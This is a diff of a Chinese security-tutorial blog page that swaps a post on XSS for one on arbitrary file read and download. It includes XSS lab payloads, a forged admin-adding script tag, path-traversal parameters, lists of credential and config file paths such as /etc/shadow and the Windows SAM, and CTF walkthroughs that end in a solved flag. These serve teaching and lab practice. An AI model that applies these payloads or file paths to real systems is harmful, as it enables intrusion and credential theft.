@@ -7,34 +7,34 @@
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="generator" content="Hugo 0.80.0 with theme Tranquilpeak 0.4.8-BETA">
 <meta name="author" content="Zor01478">
-<meta name="keywords" content="XSS, C/C&#43;&#43;, PHP, Java, 渗透">
+<meta name="keywords" content="任意文件读取&下载, C/C&#43;&#43;, PHP, Java, 渗透">
 <meta name="description" content="
-Web漏洞-XSS(跨站脚本攻击)
+Web漏洞-任意文件读取&amp;下载
 ">
 
 
 <meta property="og:description" content="
-Web漏洞-XSS(跨站脚本攻击)
+Web漏洞-任意文件读取&amp;下载
 ">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS">
-<meta name="twitter:title" content="XSS">
-<meta property="og:url" content="https://Zor01478.github.io/2021/02/xss/">
-<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/xss/">
+<meta property="og:title" content="任意文件读取与下载">
+<meta name="twitter:title" content="任意文件读取与下载">
+<meta property="og:url" content="https://Zor01478.github.io/2021/02/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD/">
+<meta property="twitter:url" content="https://Zor01478.github.io/2021/02/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD/">
 <meta property="og:site_name" content="戴头盔的招财">
 <meta property="og:description" content="
-Web漏洞-XSS(跨站脚本攻击)
+Web漏洞-任意文件读取&amp;下载
 ">
 <meta name="twitter:description" content="
-Web漏洞-XSS(跨站脚本攻击)
+Web漏洞-任意文件读取&amp;下载
 ">
 <meta property="og:locale" content="zh-cn">
 
   
-    <meta property="article:published_time" content="2021-02-09T17:56:04">
+    <meta property="article:published_time" content="2021-02-17T20:56:02">
   
   
-    <meta property="article:modified_time" content="2021-02-09T17:56:04">
+    <meta property="article:modified_time" content="2021-02-17T20:56:02">
   
   
   
@@ -71,14 +71,14 @@ Web漏洞-XSS(跨站脚本攻击)
   <meta property="twitter:image" content="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
 
 
-    <title>XSS</title>
+    <title>任意文件读取与下载</title>
 
     <link rel="icon" href="https://gitee.com/zor01478/blog-picture/raw/master/images/caomao.png">
     
 
     
 
-    <link rel="canonical" href="https://Zor01478.github.io/2021/02/xss/">
+    <link rel="canonical" href="https://Zor01478.github.io/2021/02/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD/">
 
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css" integrity="sha256-eZrrJcwDc/3uDhsdt61sL2oOBY362qM3lon1gyExkL0=" crossorigin="anonymous" />
@@ -227,15 +227,15 @@ Web漏洞-XSS(跨站脚本攻击)
       <div class="post-header main-content-wrap text-center">
   
     <h1 class="post-title" itemprop="headline">
-      XSS
+      任意文件读取与下载
     </h1>
   
   
   <div class="postShorten-meta post-meta">
     
-      <time itemprop="datePublished" datetime="2021-02-09T17:56:04&#43;08:00">
+      <time itemprop="datePublished" datetime="2021-02-17T20:56:02&#43;08:00">
         
-  二月 9, 2021
+  二月 17, 2021
 
       </time>
     
@@ -267,189 +267,198 @@ Web漏洞-XSS(跨站脚本攻击)
           <div class="post-content markdown" itemprop="articleBody">
             <div class="main-content-wrap">
               <blockquote>
-<p>Web漏洞-XSS(跨站脚本攻击)</p>
+<p>Web漏洞-任意文件读取&amp;下载</p>
 </blockquote>
 <h1 id="目录">目录</h1>
 <!-- raw HTML omitted -->
 <ul>
-<li><a href="#web%E6%BC%8F%E6%B4%9E-xss%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB">WEB漏洞-XSS(跨站脚本攻击)</a>
+<li><a href="#web%E6%BC%8F%E6%B4%9E-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8B%E8%BD%BD">Web漏洞-任意文件读取&amp;下载</a>
 <ul>
-<li><a href="#%E5%8E%9F%E7%90%86">原理</a></li>
 <li><a href="#%E4%BA%A7%E7%94%9F">产生</a></li>
-<li><a href="#%E5%8D%B1%E5%AE%B3">危害</a></li>
-<li><a href="#%E5%88%86%E7%B1%BB">分类</a></li>
-<li><a href="#%E6%89%8B%E6%B3%95">手法</a></li>
-<li><a href="#%E5%B8%B8%E8%A7%81waf%E7%BB%95%E8%BF%87%E6%80%9D%E8%B7%AF">常见waf绕过思路</a></li>
-<li><a href="#%E9%98%B2%E5%BE%A1">防御</a></li>
-<li><a href="#xss%E7%BB%83%E4%B9%A0">XSS练习</a></li>
-<li><a href="#%E6%B3%A8%E6%84%8F%E5%B7%A5%E5%85%B7%E7%9A%84%E5%90%8E%E9%97%A8">注意工具的后门</a></li>
-<li><a href="#html-dom%E6%A0%91">HTML DOM树</a></li>
+<li><a href="#%E6%A3%80%E6%B5%8B">检测</a></li>
+<li><a href="#%E5%88%A9%E7%94%A8">利用</a></li>
+<li><a href="#%E4%BF%AE%E5%A4%8D">修复</a></li>
+<li><a href="#%E5%AE%9E%E8%B7%B5">实践</a>
+<ul>
+<li><a href="#easy-java">Easy Java</a></li>
+<li><a href="#%E7%99%BE%E5%BA%A6%E6%9D%AF-ctf-%E4%BA%8C%E6%9C%88%E5%9C%BA">百度杯 CTF 二月场</a></li>
+</ul>
+</li>
 <li><a href="#%E6%B6%89%E5%8F%8A%E7%BD%91%E7%AB%99">涉及网站</a></li>
 </ul>
 </li>
 </ul>
 <!-- raw HTML omitted -->
-<h2 id="web漏洞-xss跨站脚本攻击">WEB漏洞-XSS(跨站脚本攻击)</h2>
-<h3 id="原理">原理</h3>
-<p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p>
+<h2 id="web漏洞-任意文件读取下载">Web漏洞-任意文件读取&amp;下载</h2>
 <h3 id="产生">产生</h3>
-<p>恶意攻击者在web页面中会插入一些恶意的script代码。当用户浏览该页面的时候，那么嵌入到web页面中script代码会执行，因此会达到恶意攻击用户的目的。</p>
-<h3 id="危害">危害</h3>
-<ul>
-<li>恶意攻击，窃取数据（cookie（存储在本地，存活时间较长），session（存在服务器，存活时间较短，一般大型网站），后台地址等）</li>
-<li>例如订单，获取后台地址及相关信息，只要涉及管理员交互的就可以获取到信息
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209164830.png" alt="xss示例"></li>
-</ul>
-<h3 id="分类">分类</h3>
-<ul>
-<li>反射型：发包 &ndash;&gt; x=jjj &ndash;&gt; <strong>服务器解析</strong>  &ndash;&gt; 回显执行</li>
-<li>存储型：发包 &ndash;&gt; x=jjj &ndash;&gt; <strong>写入数据库</strong> &ndash;&gt;  <strong>服务器解析</strong>  &ndash;&gt; 回显执行   【评论，留言，订单，反馈条件等】</li>
-<li>DOM型：发包 &ndash;&gt; x=jjj &ndash;&gt; <strong>浏览器解析执行（本地静态前端代码）</strong> &ndash;&gt; 回显执行</li>
-</ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span><span style="color:#a6e22e">alert</span>(<span style="color:#ae81ff">1</span>)<span style="color:#f92672">&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-</code></pre></div><h3 id="手法">手法</h3>
+<p>没有对读取或下载做一个白名单或者限制(任意语言代码下载功能函数)</p>
+<h3 id="检测">检测</h3>
 <ul>
 <li>
-<p>XSS平台使用
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209165456.png" alt="XSS平台使用">
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209165525.png" alt="XSS平台使用"></p>
+<p>白盒</p>
+<ul>
+<li>代码审计</li>
+</ul>
 </li>
 <li>
-<p>XSS工具使用：postman，beef神器
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209165654.png" alt="XSS工具使用"></p>
-</li>
-<li>
-<p>XSS结合其他漏洞</p>
+<p>黑盒</p>
+<ul>
+<li>工具</li>
+<li>公开漏洞</li>
+<li>手工查看功能点（资源下载）及三数值</li>
+</ul>
 </li>
 </ul>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-javascript" data-lang="javascript"><span style="color:#a6e22e">比如</span> <span style="color:#a6e22e">www</span><span style="color:#ae81ff">.1236</span>.<span style="color:#a6e22e">com后台添加管理员的数据包</span><span style="color:#960050;background-color:#1e0010">：</span>
-<span style="color:#a6e22e">www</span><span style="color:#ae81ff">.1236</span>.<span style="color:#a6e22e">com</span><span style="color:#f92672">/</span><span style="color:#a6e22e">adduser</span>.<span style="color:#a6e22e">php</span><span style="color:#f92672">?</span><span style="color:#a6e22e">username</span><span style="color:#f92672">=</span><span style="color:#a6e22e">mob</span><span style="color:#f92672">&amp;</span><span style="color:#a6e22e">password</span><span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
-
-<span style="color:#a6e22e">然后某人在自己博客首页文件加入代码</span><span style="color:#960050;background-color:#1e0010">：</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">src</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://www.1236.com/adduser.php?username=mob&amp;password=123456&#34;</span><span style="color:#f92672">&gt;&lt;</span><span style="color:#960050;background-color:#1e0010">/script&gt;</span>
-
-<span style="color:#a6e22e">然后1236网站的管理员打开了这个微博</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">若果此时该管理员的浏览器是登陆状态</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">会发生什么</span><span style="color:#960050;background-color:#1e0010">？</span>
-<span style="color:#a6e22e">会自动添加一个管理员</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">这个来源针对1236是那个博客地址</span><span style="color:#960050;background-color:#1e0010">，</span><span style="color:#a6e22e">并非1236的域名</span><span style="color:#960050;background-color:#1e0010">。</span>
-
-<span style="color:#a6e22e">防御</span>
-   <span style="color:#a6e22e">检测来源</span><span style="color:#960050;background-color:#1e0010">：</span> <span style="color:#a6e22e">同源策略</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">是否同一域名</span>
-</code></pre></div><h3 id="常见waf绕过思路">常见waf绕过思路</h3>
+<h3 id="利用">利用</h3>
 <ul>
 <li>
-<p>标签语法替换</p>
+<p>常见文件&ndash;后台首页日志等可见文件</p>
 </li>
 <li>
-<p>特殊符号干扰</p>
-</li>
-<li>
-<p>提交方式更改</p>
-</li>
-<li>
-<p>垃圾数据溢出</p>
-</li>
-<li>
-<p>加密解密算法</p>
-</li>
-<li>
-<p>结合其他漏洞</p>
-</li>
-<li>
-<p>Context分析</p>
-</li>
-<li>
-<p>可配置的核心</p>
-</li>
-<li>
-<p>只能playload生成器</p>
-</li>
-<li>
-<p>fuzz搜索引擎</p>
-</li>
-<li>
-<p>盲打XSS支持</p>
-</li>
-<li>
-<p>完整的HTTP支持</p>
-</li>
-</ul>
-<h3 id="防御">防御</h3>
+<p>敏感文件（扫描工具扫描网站目录结构）</p>
 <ul>
-<li>代码过滤
-<ul>
-<li><code>&quot;&lt;script&gt;&quot;、&quot;&lt;a&gt;&quot;、&quot;&lt;img&gt;&quot;等标签进行过滤 、&amp;lt; &gt; &quot; &amp; / '</code></li>
-<li>编码转义</li>
-<li>限制输入长度</li>
+<li>数据库配置文件</li>
+<li>各种借口文件</li>
+<li>秘钥信息文件</li>
+<li>&hellip;</li>
 </ul>
 </li>
-<li>设置黑白名单</li>
-<li>http only</li>
-<li>WAF拦截</li>
-</ul>
-<h3 id="xss练习">XSS练习</h3>
+<li>
+<p>常见文件名，参数值，目录符号</p>
 <ul>
-<li>在线靶场：http://xss.fbisb.com/yx/level1.php?name=test</li>
+<li>read.xxx?filename=</li>
+<li>down.xxx?filename=</li>
+<li>readfile.xxx?file=</li>
+<li>downfile.xxx?file=</li>
+<li>../   ..\  .\  ./  &hellip;</li>
+<li>%00  ？ %23  %20 &hellip;</li>
+<li>&amp;readpath，&amp;filepath=，&amp;path=，&amp;inputfile=，&amp;url=，&amp;data=，&amp;readfile=，- &amp;menu=，META-INF=，WEB-INF</li>
 </ul>
-<pre><code>1. payload：name=&lt;script&gt;alert(真棒)&lt;/script&gt;
-
-2. payload：&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
-
-3. payload：' οnclick=alert()
-
-4. payload：&quot; οnclick=alert()
-
-5. payload：&quot;/&gt;&lt;a href=javascript:alert(&quot;厉害了垃圾管理员&quot;)&gt;进入下一关&lt;/a&gt;
-
-6. payload：&quot;/&gt;&lt;a hRef=javascript:alert(&quot;厉害了垃圾管理员&quot;)&gt;进入下一关&lt;/a&gt;
-
-7. payload：&quot;&gt;&lt;scripscriptt&gt;alert()&lt;/scrscriptipt&gt;  或
-   &quot;&gt;&lt;scrscriptipt&gt;alert(&quot;我过了&quot;)&lt;/sscriptcript&gt;
-   
-8. payload：javascrip&amp;#116;:alert()     t  --&gt; (Unicode编码) &amp;#116; 
-  涉及html实体编码解析           
-  https://blog.csdn.net/jiaguoxinzhi/article/details/45313279/
-  安全编码和XSS编码
-  https://zhidao.baidu.com/question/2011925518346211588.html
-  
-9. payload：javascrip&amp;#116;:alert(&quot;这都能想到&quot;)//http://
-   javascrip&amp;#x74:alert(&quot;这都能想到&quot;)//http://      【t的十六进制】
-10. t_sort=&quot;onclick=alert(&quot;牛批之前面试还遇到过&quot;) type=&quot;text&quot;   HTML属性
-    t_sort=&quot; type=&quot;text&quot; onclick=alert()//
-    
-11. 将payload给 Referer就可以了，抓包然后添加以下
-    Referer:&quot; type=&quot;text&quot; onclick=alert() &quot;
-   
-12. 一顿乱输，查看页面源码发现了User-Agent，试图抓包用payload 直接完全修改UA但是失败了，服务器返回了错误，所以直接添加在原有数据的后面
-   User-Agent: &quot; type=&quot;text&quot; onclick=alert() &quot;
-   
-13. 查看页面源码发现了t_cook参数有值，估计和cookie有关，抓个包看看。
-    Cookie: user=call+me+maybe%3F，发现修改值对应的t_cook的value也会修改
-    直接将payload给user呗，Cookie: user=&quot; type=&quot;text&quot; onclick=alert() &quot;
-
-14. 坏了
-15. 不太行了，涉及知识AngularJS ng-include        
-    https://www.runoob.com/angularjs/ng-ng-include.html
-    
-16. http://xssaq.com/yx/level16.php?keyword=1111  页面有显示
-    script被过滤的很彻底，查看源码考虑标签：img
-    paylaod：keyword=&lt;img src=1 Onerror=alert()&gt;
-    什么都没有发生，查看源码发现空格被实体化了，故考虑url编码替换；找个能代替space的字符，比如%0A是换行，反正也不会影响。
-    payload：keyword=&lt;img%0Asrc=1%0AOnerror=alert()&gt;
-    
-17. ~ 20. 均涉及flash，不能显示加上也不会....
-</code></pre><h3 id="注意工具的后门">注意工具的后门</h3>
+</li>
+</ul>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">符号</th>
+<th style="text-align:center">含义</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">./</td>
+<td style="text-align:center">当前目录</td>
+</tr>
+<tr>
+<td style="text-align:center">../</td>
+<td style="text-align:center">上级目录（即父目录）</td>
+</tr>
+<tr>
+<td style="text-align:center">/</td>
+<td style="text-align:center">根目录</td>
+</tr>
+</tbody>
+</table>
+<hr>
+<p>// 常见的敏感信息路径</p>
 <ul>
-<li>获取你的webshell
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209171941.png" alt="工具的后门">
-<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209171958.png" alt="工具的后门"></li>
+<li>
+<p>Windows</p>
+<ul>
+<li>c:\boot.ini // 查看系统版本</li>
+<li>c:\XX\httpd.conf   Apache配置信息</li>
+<li>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件</li>
+<li>c:\windows\repair\sam // 存储Windows系统初次安装的密码</li>
+<li>c:\ProgramFiles\mysql\my.ini // MySQL配置</li>
+<li>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码</li>
+<li>c:\windows\php.ini // php 配置信息</li>
 </ul>
-<h3 id="html-dom树">HTML DOM树</h3>
-<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/20210209172629.png" alt="HTML DOM树"></p>
+</li>
+<li>
+<p>Linux/Unix</p>
+<ul>
+<li>/etc/passwd  账户信息</li>
+<li>/etc/shadow  账户密码文件</li>
+<li>/etc/httpd/conf/httpd.conf  Apache配置文件</li>
+<li>/etc/my.conf  mysql 配置文件</li>
+<li>/usr/local/app/apache2/conf/httpd.conf  Apache2默认配置文件</li>
+<li>/usr/local/app/apache2/conf/extra/httpd-vhost.conf     虚拟网站配置</li>
+<li>/usr/local/app/php5/lib/php.ini  PHP相关配置</li>
+</ul>
+</li>
+</ul>
+<hr>
+<h3 id="修复">修复</h3>
+<ul>
+<li>WAF</li>
+<li>固定目录或过滤跨目录符号</li>
+<li>目录权限设置或单独文件资源设置</li>
+</ul>
+<blockquote>
+<p>文件被解析：文件包含漏洞
+显示源码：文件读取漏洞
+提示文件下载：文件下载漏洞</p>
+</blockquote>
+<h3 id="实践">实践</h3>
+<h4 id="easy-java">Easy Java</h4>
+<ul>
+<li>题目地址：https://buuoj.cn/challenges#%5BRoarCTF%202019%5DEasy%20Java</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9601.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9602.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9603.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9604.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9605.png" alt=""></p>
+<ul>
+<li>
+<p><a href="http://a85d669b-1621-4606-9dbf-9dba10f7d4a7.node3.buuoj.cn/Download?filename=help.docx">http://a85d669b-1621-4606-9dbf-9dba10f7d4a7.node3.buuoj.cn/Download?filename=help.docx</a>   <strong>修改它会不会进行下载呢？</strong></p>
+</li>
+<li>
+<p>考虑到网站开发脚本的配置文件：根据题目提示Easy Java</p>
+</li>
+<li>
+<p>Javaweb的配置文件：<code>WEB-INF/web.xml</code></p>
+</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9606.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9607.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9608.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9609.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9610.png" alt=""></p>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9611.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9612.png" alt=""></p>
+<ul>
+<li>flag{b0ac66b4-3308-4266-80f3-954eb9f0775a}   填进去完事了。</li>
+</ul>
+<h4 id="百度杯-ctf-二月场">百度杯 CTF 二月场</h4>
+<ul>
+<li>题目地址：https://www.ichunqiu.com/battalion?t=1&amp;r=57475</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9613.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9614.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9615.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9616.png" alt=""></p>
+<ul>
+<li>module=../../../etc/passwd&amp;name=    也没有回显</li>
+<li>?module=&hellip;/./&hellip;/./&hellip;/./etc/nginx/nginx.conf&amp;name=</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9617.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9618.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9619.png" alt=""></p>
+<ul>
+<li>
+<p><a href="http://56e0fb2bd83144c7963ec96f93a0074d4cfd212d04604113.changame.ichunqiu.com/online-movies/">http://56e0fb2bd83144c7963ec96f93a0074d4cfd212d04604113.changame.ichunqiu.com/online-movies/</a></p>
+</li>
+<li>
+<p>/online-movies../  这个目录下</p>
+</li>
+</ul>
+<p><img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9620.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9621.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9622.png" alt="">
+<img src="https://gitee.com/zor01478/blog-picture/raw/master/img/%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD&amp;%E8%AF%BB%E5%8F%9623.png" alt=""></p>
 <h3 id="涉及网站">涉及网站</h3>
 <ol>
-<li><a href="https://xss8.cc/xss.php?do=login">https://xss8.cc/xss.php?do=login</a>      【XSS平台】</li>
-<li><a href="https://xsshs.cn/xss/php?do=login">https://xsshs.cn/xss/php?do=login</a>     【XSS平台】</li>
-<li><a href="https://github.com/do0dl3/xss-labs">https://github.com/do0dl3/xss-labs</a>    【Aboutxss 跨站漏洞平台】</li>
-<li><a href="https://gitee.com/yhtmxl/imxss">https://gitee.com/yhtmxl/imxss</a>      【XSS平台】</li>
-<li><a href="https://github.com/s0md3v/XSStrike">https://github.com/s0md3v/XSStrike</a>   【XSS自动扫描脚本】</li>
+<li><a href="https://www.seebug.org/vuldb/ssvid-98122">https://www.seebug.org/vuldb/ssvid-98122</a>   【小米路由器远程任意文件读取漏洞（CVE-2019-18371）】</li>
 </ol>
               
             </div>
@@ -475,7 +484,7 @@ Web漏洞-XSS(跨站脚本攻击)
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/sql%E6%B3%A8%E5%85%A5/" data-tooltip="SQL注入">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-tooltip="文件包含">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
@@ -483,7 +492,7 @@ Web漏洞-XSS(跨站脚本攻击)
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/csrf%E4%B8%8Essrf/" data-tooltip="CSRF与SSRF">
+                <a class="post-action-btn btn btn--disabled">
               
                   <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -543,7 +552,7 @@ Web漏洞-XSS(跨站脚本攻击)
           
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/sql%E6%B3%A8%E5%85%A5/" data-tooltip="SQL注入">
+                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/" data-tooltip="文件包含">
               
                   <i class="fa fa-angle-left"></i>
                   <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
@@ -551,7 +560,7 @@ Web漏洞-XSS(跨站脚本攻击)
             </li>
             <li class="post-action">
               
-                <a class="post-action-btn btn btn--default tooltip--top" href="https://Zor01478.github.io/2021/02/csrf%E4%B8%8Essrf/" data-tooltip="CSRF与SSRF">
+                <a class="post-action-btn btn btn--disabled">
               
                   <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
                   <i class="fa fa-angle-right"></i>
@@ -685,9 +694,9 @@ $(document).ready(function() {
     
       <script>
         var disqus_config = function () {
-          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/xss\/';
+          this.page.url = 'https:\/\/Zor01478.github.io\/2021\/02\/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD\/';
           
-            this.page.identifier = '\/2021\/02\/xss\/'
+            this.page.identifier = '\/2021\/02\/%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E4%B8%8E%E4%B8%8B%E8%BD%BD\/'
           
         };
         (function() {
